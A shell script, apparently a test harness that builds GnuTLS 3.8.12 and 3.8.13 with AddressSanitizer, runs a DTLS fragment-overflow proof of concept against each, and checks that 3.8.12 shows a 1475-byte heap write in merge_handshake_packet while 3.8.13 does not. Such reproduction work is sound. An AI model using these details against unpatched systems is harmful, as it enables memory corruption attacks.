#!/bin/sh
# Verify pinned hashes, rebuild if needed, then replay the three scenarios.
# Every check prints PASS/FAIL; the final line is RESULT PASS=n FAIL=m.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
cd "$HERE"
P=0; F=0
ck() { if [ "$2" = "$3" ]; then echo "PASS $1"; P=$((P+1)); else echo "FAIL $1: got '$2' want '$3'"; F=$((F+1)); fi; }
has() { if grep -q "$2" "$3" 2>/dev/null; then echo "PASS $1"; P=$((P+1)); else echo "FAIL $1: '$2' absent from $3"; F=$((F+1)); fi; }
no()  { if grep -q "$2" "$3" 2>/dev/null; then echo "FAIL $1: '$2' present in $3"; F=$((F+1)); else echo "PASS $1"; P=$((P+1)); fi; }

ck tarball-3.8.12-sha256 "$(sha256sum src/gnutls-3.8.12.tar.xz | cut -d' ' -f1)" a7b341421bfd459acf7a374ca4af3b9e06608dcd7bd792b2bf470bea012b8e51
ck tarball-3.8.13-sha256 "$(sha256sum src/gnutls-3.8.13.tar.xz | cut -d' ' -f1)" ffed8ec1bf09c2426d4f14aae377de4753b53e537d685e604e99a8b16ca9c97e
ck nettle-3.10-sha256 "$(sha256sum src/nettle-3.10.tar.gz | cut -d' ' -f1)" b4c518adb174e484cb4acea54118f02380c7133771e7e9beb98a0787194ee47c

sh build.sh || { echo "FAIL build"; F=$((F+1)); }

mkdir -p evidence
LP="$HERE/opt/lib64"
ASAN='detect_leaks=0:abort_on_error=0'

for V in 3.8.12 3.8.13; do
  gcc -fsanitize=address -g -O1 -fno-omit-frame-pointer \
    -I"build-$V-asan/lib/includes" -I"build-$V-asan" \
    poc_dtls_fragment_overflow.c -L"build-$V-asan/lib/.libs" \
    -lgnutls -lpthread -Wl,-rpath,"$HERE/build-$V-asan/lib/.libs" \
    -Wl,-rpath,"$LP" -o "poc-$V"
done

timeout 40 env LD_LIBRARY_PATH="$LP" ASAN_OPTIONS="$ASAN" ./poc-3.8.12 \
  >evidence/attack-asan-3.8.12.out 2>&1; echo "rc-vuln-attack=$?"
has vuln-asan-heap-overflow 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/attack-asan-3.8.12.out
has vuln-asan-write-1475 'WRITE of size 1475' evidence/attack-asan-3.8.12.out
has vuln-sink 'merge_handshake_packet ../../src/gnutls-3.8.12/lib/buffers.c:1035' evidence/attack-asan-3.8.12.out
has vuln-alloc-2048 '2048-byte region' evidence/attack-asan-3.8.12.out
has vuln-caller '_gnutls_parse_record_buffered_msgs' evidence/attack-asan-3.8.12.out

timeout 40 env SAFE=1 LD_LIBRARY_PATH="$LP" ASAN_OPTIONS="$ASAN" ./poc-3.8.12 \
  >evidence/safe-asan-3.8.12.out 2>&1; echo "rc-vuln-safe=$?"
no safe-no-asan 'AddressSanitizer' evidence/safe-asan-3.8.12.out
has safe-handshake 'handshake returned' evidence/safe-asan-3.8.12.out

timeout 40 env LD_LIBRARY_PATH="$LP" ASAN_OPTIONS="$ASAN" ./poc-3.8.13 \
  >evidence/attack-asan-3.8.13.out 2>&1; echo "rc-fixed-attack=$?"
no fixed-no-asan 'AddressSanitizer' evidence/attack-asan-3.8.13.out
has fixed-handshake 'handshake returned' evidence/attack-asan-3.8.13.out

echo "RESULT PASS=$P FAIL=$F"
